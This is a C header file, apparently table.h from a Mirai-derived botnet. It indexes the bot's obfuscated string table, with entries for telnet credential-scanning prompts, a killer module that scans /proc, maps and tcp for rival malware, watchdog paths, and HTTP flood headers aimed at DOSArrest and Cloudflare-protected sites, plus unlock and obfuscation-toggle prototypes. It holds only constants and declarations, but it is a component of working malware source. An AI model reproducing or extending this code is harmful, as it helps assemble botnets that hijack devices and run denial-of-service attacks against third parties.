#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};

#define TABLE_EXEC_SUCCESS 1
#define TABLE_SCAN_SHELL 2
#define TABLE_SCAN_ENABLE 3
#define TABLE_SCAN_SYSTEM 4
#define TABLE_SCAN_SH 5
#define TABLE_SCAN_QUERY 6
#define TABLE_SCAN_RESP 7
#define TABLE_SCAN_NCORRECT 8
#define TABLE_SCAN_ASSWORD 9
#define TABLE_SCAN_OGIN 10
#define TABLE_SCAN_ENTER 11
#define TABLE_SCAN_BAH 12
#define TABLE_SCAN_LINUXSHELL 13
#define TABLE_SCAN_START 14
#define TABLE_KILLER_PROC 15
#define TABLE_KILLER_EXE 16
#define TABLE_KILLER_FD 17
#define TABLE_KILLER_MAPS 18
#define TABLE_KILLER_TCP 19
#define TABLE_MAPS_MIRAI 20
#define TABLE_MAPS_SHINTO3 21
#define TABLE_MAPS_SHINTO5 22
#define TABLE_MAPS_JOSHO1 23
#define TABLE_MAPS_UPX 24
#define TABLE_MAPS_ASSWORD 25
#define TABLE_ATK_VSE 26
#define TABLE_ATK_RESOLVER 27
#define TABLE_ATK_NSERV 28
#define TABLE_MISC_WATCHDOG 29
#define TABLE_MISC_WATCHDOG2 30
#define TABLE_MISC_WATCHDOG3 31
#define TABLE_MISC_WATCHDOG4 32
#define TABLE_MISC_WATCHDOG5 33
#define TABLE_MISC_WATCHDOG6 34
#define TABLE_MISC_RANDOM 35
#define TABLE_ATK_HTTP 36
#define TABLE_ATK_USRAGENT 37
#define TABLE_ATK_HOST 38
#define TABLE_ATK_GET 39
#define TABLE_ATK_POST 40
#define TABLE_ATK_KEEP_ALIVE 41
#define TABLE_ATK_ACCEPT 42
#define TABLE_ATK_ACCEPT_LNG 43
#define TABLE_ATK_CONTENT_TYPE 44
#define TABLE_ATK_SET_COOKIE 45
#define TABLE_ATK_REFRESH_HDR 46
#define TABLE_ATK_LOCATION_HDR 47
#define TABLE_ATK_SET_COOKIE_HDR 48
#define TABLE_ATK_CONTENT_LENGTH_HDR 49
#define TABLE_ATK_TRANSFER_ENCODING_HDR 50
#define TABLE_ATK_CHUNKED 51
#define TABLE_ATK_KEEP_ALIVE_HDR 52
#define TABLE_ATK_CONNECTION_HDR 53
#define TABLE_ATK_DOSARREST 54
#define TABLE_ATK_CLOUDFLARE_NGINX 55
#define TABLE_HTTP_ONE 56
#define TABLE_HTTP_TWO 57
#define TABLE_HTTP_THREE 58
#define TABLE_HTTP_FOUR 59
#define TABLE_HTTP_FIVE 60
#define TABLE_HTTP_SIX 61
#define TABLE_HTTP_SEVEN 62
#define TABLE_HTTP_EIGHT 63
#define TABLE_HTTP_NINE 64
#define TABLE_HTTP_TEN 65

#define TABLE_MAX_KEYS 65

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
